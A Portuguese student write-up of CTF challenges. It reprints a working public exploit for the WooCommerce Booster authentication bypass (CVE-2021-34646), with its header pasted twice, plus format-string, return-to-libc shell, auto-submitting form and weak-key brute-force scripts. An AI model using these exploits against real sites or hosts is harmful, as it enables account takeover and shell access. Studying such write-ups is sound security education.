## Secure WP Hosting

Encontramos um exploit online.

<details><summary>Exploit</summary>
<p>

    # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
    # Date: 2021-09-16
    # Exploit Author: Sebastian Kriesten (0xB455)
    # Contact: https://twitter.com/0xB455
    #
    # Affected Plugin: Booster for WooCommerce
    # Plugin Slug: woocommerce-jetpack
    # Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
    # Affected Versions: <= 5.4.3
    # Fully Patched Version: >= 5.4.4
    # CVE: CVE-2021-34646
    # CVSS Score: 9.8 (Critical)
    # Category: webapps
    #
    # 1:
    # Goto: https://target.com/wp-json/wp/v2/users/
    # Pick a user-ID (e.g. 1 - usualy is the admin)
    #
    # 2:
    # Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
    #
    # 3:
    # Check-Out  out which of the generated links allows you to access the system
    #
    import requests,sys,hashlib
    import argparse
    import datetime
    import email.utils
    import calendar
    import base64  # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
    # Date: 2021-09-16
    # Exploit Author: Sebastian Kriesten (0xB455)
    # Contact: https://twitter.com/0xB455
    #
    # Affected Plugin: Booster for WooCommerce
    # Plugin Slug: woocommerce-jetpack
    # Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
    # Affected Versions: <= 5.4.3
    # Fully Patched Version: >= 5.4.4
    # CVE: CVE-2021-34646
    # CVSS Score: 9.8 (Critical)
    # Category: webapps
    #
    # 1:
    # Goto: https://target.com/wp-json/wp/v2/users/
    # Pick a user-ID (e.g. 1 - usualy is the admin)
    #
    # 2:
    # Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
    #
    # 3:
    # Check-Out  out which of the generated links allows you to access the system
    #
    import requests,sys,hashlib
    import argparse
    import datetime
    import email.utils
    import calendar
    import base64
    
    B = "\033[94m"
    W = "\033[97m"
    R = "\033[91m"
    RST = "\033[0;0m"
    
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the base url")
    parser.add_argument('id', type=int, help='the user id', default=1)
    args = parser.parse_args()
    id = str(args.id)
    url = args.url
    if args.url[-1] != "/": # URL needs trailing /
          url = url + "/"
    
    verify_url= url + "?wcj_user_id=" + id
    r = requests.get(verify_url)
    
    if r.status_code != 200:
          print("status code != 200")
          print(r.headers)
          sys.exit(-1)
    
    def email_time_to_timestamp(s):
      tt = email.utils.parsedate_tz(s)
      if tt is None: return None
      return calendar.timegm(tt) - tt[9]
    
    date = r.headers["Date"]
    unix = email_time_to_timestamp(date)
    
    def printBanner():
      print(f"{W}Timestamp: {B}" + date)
      print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
      print("We need to generate multiple timestamps in order to avoid delay related timing errors")
      print("One of the following links will log you in...\n")
    
    printBanner()
    
    for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
          hash = hashlib.md5(str(unix-i).encode()).hexdigest()
          print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
          token='{"id":"'+ id +'","code":"'+hash+'"}'
          token = base64.b64encode(token.encode()).decode()
          token = token.rstrip("=") # remove trailing =
          link = url+"my-account/?wcj_verify_email="+token
          print(link + f"\n{RST}")
 

</p>
</details>

Executando o comando __python3 exploit.py url id__ , sendo requerido id quando usamos este tipo de comando, obtemos:

![S1](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/9f9a1c38-4d46-4f11-9a8b-d3cbb2ae88e5)

Abrindo o primeiro link somos presenteados com a seguinte página web.

![S2](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/92bca748-e6c6-448f-b980-ff6c3dc8c779)

Clicando no botão superior esquerdo, onde diz Secure WP Hosting.
    
![S3](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/7980664a-88e3-448f-a0d5-51dc9094f1c5)

O resultado desta ação dá-nos acesso à WordPress Dashboard.
    
![S4](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/406701a4-b2d4-4d1f-baf8-b1cacecf8a1a)

O objetivo é ir à secção Posts.
    
![S5](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/bd198575-37e3-4d4b-9dce-c7326d621ad1)

De seguida clicamos no post 'Message to our employes' e obtemos a flag descrita como a pass atual.
    
![S6](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/f65141c1-5ec1-44be-a7b2-5c09c16a9c2d)

 
    
## Final Format

Primeiro testamos o comando nc ctf-sp.dcc.fc.up.pt 4007 e testamos se a vulnerabilidade string format está presente ("a%x%x%x).

![FF1](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/3e7377d0-33ee-45f3-9a49-c39b5b3da3ec)

Depois, usamos o comando gdb no nosso programa (gdb program) e verificamos todas as funções presentes no nosso código, usando o comando info fuctions.

![FF3](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/7c89887a-5b90-450b-ba24-25c13f3eebe2)

Analisando a função old_backdoor com o comando disas, encontramos uma system cal que abriria um shell.

![FF4](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/638b4914-91e9-42a2-96db-8122d7de4e50)

Como precisávamos de executar essa função, queríamos redirecionar o programa para esse endereço.

Para fazer isso, usamos o gdb para encontrar instruções onde o código saltava para outros endereços. Encontramos um salto para o seguinte endereço: 0x0804c010.

Depois disso, construímos um exploit que reescreveria a função old_backdoor para esse endereço usando vulnerabilidades de format string:

<details><summary>exploit.py</summary>
<p>

    from pwn import *

    LOCAL = False
    
    if LOCAL:
        pause()
    else:
        p = remote("ctf-sp.dcc.fc.up.pt", 4007)
    
    #0x08049236  old_backdoor
    
    N = 60
    content = bytearray(0x0 for i in range(N))
    
    content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
    content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
    content[8:12]  =  ("????").encode('latin-1')
    content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')
    
    s = "%.2036x" + "%hn" + "%.35378x%hn"
    
    fmt  = (s).encode('latin-1')
    content[16:16+len(fmt)] = fmt
    
    p.recvuntil(b"here...")
    p.sendline(content)
    p.interactive()
</p>
</details>

Correndo o exploit no terminal, conseguimos ter acesso à flag através do ficheiro flag.txt que se encontrava no working directory.

![FF5](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/5fe4c838-9165-4927-a90b-c98def61bd55)



## Apply For Flag II 

De modo a resolvermos este desafio, temos de "disable javascript". Para fazer isso, pesquisamos `about:config` no firefox, pesquisamos `javascript.enabled` e mudamos o javascript.enabled para "false" no botão à direita.

![7](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/6f7664e1-fe5e-4923-8939-ac97a3892b57)

Abrindo o servidor http://ctf-sp.dcc.fc.up.pt:5004 vemos:
    
![A1](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/c2f463df-dd19-4410-8a72-18603aa8eabc)

De seguida, temos de criar um pedido de post para a url 'http://ctf-sp.dcc.fc.up.pt:5004/request/' seguida do id apresentado na página inicial.
Para o fazer, submetemos o seguinte código na barra de input do servidor.

```html
<form method="POST" action="http://ctf-sp.dcc.fc.up.pt:5004/request/c8e1c2e6944739f9e359d7df3054dcea05163757/approve" role="form">          
    <div class="submit">                  
        <input type="submit" id="giveflag" value="Give the flag">   
    </div>  
</form>    

<script type="text/javascript"> 
    document.querySelector('#giveflag').click();  
</script>
```

O resultado desta submissão dá-nos acesso à seguinte página.
    
![3](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/b90f0558-fc55-4370-8b68-c5bc13d7f97b)

Clicando na opção `Give the flag` somos encaminhados para a seguinte página.
    
![4](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/356728ec-b00f-4c77-b59c-668a4828e61a)
    
Optamos por tentar a opção `page` e obtemos:

![5](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/bd9afaf0-f375-4225-8c5c-c2de4a7a1976)
    
Clicando na opção `here` somos presenteados com a desejada flag.
    
![6](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/8326a007-bf1e-4e37-995b-37736e8ee8f3)


    
## Echo 

Primeiro, testamos o comando nc ctf-sp.dcc.fc.up.pt 4002.

Verificamos se a vulnerabilidade format string estava a ocorrer.

![E1](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/072f828f-d122-42e4-8149-0fdd2f598afa)

Como conseguiamos returnar a informação da stack, confirmou-se que a vulnerabilidade format string ocorria.

Recorremos ao ataque 'Return-to-libc' e criamos a seguinte script.

<details><summary>script.py</summary>
<p>

    #!/usr/bin/python3
    from pwn import *
    
    LOCAL = False
    
    referenceLibOffset = 0xf7daa519 - 0xf7d89000
    systemLibOffset = 0x48150
    shLibOffset = 0x1bd0f5
    
    def sendMessage(p, message):
        p.recvuntil(b">")
        p.sendline(b"e")
        p.recvuntil(b"Insert your name (max 20 chars): ")
        p.sendline(message)
        answer = p.recvline()
        p.recvuntil(b"Insert your message: ")
        p.sendline(b"")
        return answer
    
    if LOCAL:
        pause()
    else:
        p = remote("ctf-sp.dcc.fc.up.pt", 4002)
    
    firstMessage = sendMessage(p, b"%8$x-%11$x")
    
    canary, referenceVal = [int (val, 16) for val in firstMessage.split(b'-')]
    
    libBase = referenceVal - referenceLibOffset
    addressSystem = libBase + systemLibOffset
    addressSH = libBase + shLibOffset
    
    secondMessage = flat(b"A"*20, canary + 1, b"A"*8, addressSystem, b"A"*4, addressSH)
    
    sendMessage(p, secondMessage)
    
    sendMessage(p, b"A"*19)
    
    p.interactive()
</p>
</details>

Corremos a nossa script e obtemos a flag.

![E2](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/2c92194b-a8f0-46a2-9ad0-63ac2c440ad2)



## NumberStation3

Testamos o comando nc ctf-sp.dcc.fc.up.pt 6002.

![N1](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/558e9147-91f0-49ac-b164-d3b0613f1a11)

Modificamos o ficheiro challenge.py de modo a obtermos a flag, com a informação fornecida pelo comando nc ctf-sp.dcc.fc.up.pt 6002.

<details><summary>challenge.py</summary>
<p>

    # Python Module ciphersuite
    import os
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from binascii import unhexlify
    
    FLAG_FILE = '/flags/flag.txt'
    
    # Use crypto random generation to get a key with length n
    def gen():
        rkey = bytearray(os.urandom(16))
        for i in range(16): rkey[i] = rkey[i] & 1
        return bytes(rkey)
    
    
    # Reverse operation
    def dec(k, c):
        assert len(c) % 16 == 0
        cipher = Cipher(algorithms.AES(k), modes.ECB(), default_backend())
        decryptor = cipher.decryptor()
        blocks = len(c) // 16
        msg = b""
        for i in range(0, blocks):
            msg += decryptor.update(c[i * 16:(i + 1) * 16])
            msg = msg[:-15]
        msg += decryptor.finalize()
        return msg
    
    
    c_shell = b"a4265438966c0bbf9fec57b92cf3d07881fe8471069c58c6933d919856554f5172a26d395523455a0f294a69eaf500307daec216d45edc39acfdb274a627d676cfcfc238f2a5cf530b068823a348065c72a26d395523455a0f294a69eaf50030ee04c871fd1fc6ca897d7be15def271f5641997f728988600348c46e1e12b7f138d11456022b76a11274fad40092b56b77c22b2bfb73e446fd3ae8f60466d23477c22b2bfb73e446fd3ae8f60466d2340115928a2c13fb84b05f9a5ae2d6c41d72a26d395523455a0f294a69eaf50030ee04c871fd1fc6ca897d7be15def271f5641997f728988600348c46e1e12b7f19899cef5b48a577677d477273e53b78238d11456022b76a11274fad40092b56bb75faab604dd97a97961aff6a534430e4e48fb466f9c27a2a1ff86ed16fff9d89899cef5b48a577677d477273e53b7820115928a2c13fb84b05f9a5ae2d6c41dfdc4e25ab86ebba15bc1eb1554a16e0a38b2a9419b8fef226f1618ea2ac6fe88813776309006a4364d3f8b58f322b37972a26d395523455a0f294a69eaf5003077c22b2bfb73e446fd3ae8f60466d23449f17829b872c0e9ad072dc83eb938e472a26d395523455a0f294a69eaf5003038b2a9419b8fef226f1618ea2ac6fe885641997f728988600348c46e1e12b7f138b2a9419b8fef226f1618ea2ac6fe88fdc4e25ab86ebba15bc1eb1554a16e0ac867866163a88da49b23dca1c797b89577c22b2bfb73e446fd3ae8f60466d234ee04c871fd1fc6ca897d7be15def271f77c22b2bfb73e446fd3ae8f60466d23449f17829b872c0e9ad072dc83eb938e4ab9791c59f15488c9db91e1a26c0fb04af216288f6f47c59db353e9a182e6ed5"
    
    for i in range(2 ** 16):
        # print(i)
        k2 = gen()
        if dec(k2, unhexlify(c_shell)).decode('latin-1')[0:4] == "flag":
            print(dec(k2,unhexlify(c_shell)).decode('latin-1'))
            break
</p>
</details>

Depois de correr o programa, obtemos a flag.

![N2](https://github.com/DCC-FCUP-SP/sp2223-t04g06/assets/116459746/affddfae-3ebc-4ff4-99d3-1f94d0ce0ff3)

É de notar que é necessário ter uma pasta "flag" com o ficheiro "flags.txt" dentro da pasta no working directory.
